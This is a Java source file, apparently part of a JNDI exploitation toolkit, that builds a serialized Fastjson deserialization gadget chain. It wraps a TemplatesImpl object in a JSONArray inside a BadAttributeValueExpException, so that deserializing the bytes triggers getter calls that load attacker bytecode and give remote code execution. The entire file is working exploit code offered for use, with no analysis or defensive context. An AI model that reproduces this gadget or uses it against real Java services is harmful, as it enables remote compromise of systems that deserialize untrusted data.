package map.jndi.gadget;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import map.jndi.util.ReflectUtil;
import map.jndi.util.SerializeUtil;

import javax.management.BadAttributeValueExpException;
import java.util.ArrayList;

public class Fastjson1 {
    public static byte[] create(TemplatesImpl templatesImpl) throws Exception {
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templatesImpl);

        BadAttributeValueExpException e = new BadAttributeValueExpException("test");
        ReflectUtil.setFieldValue(e, "val", jsonArray);

        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(templatesImpl);
        arrayList.add(e);

        return SerializeUtil.serialize(arrayList);
    }
}
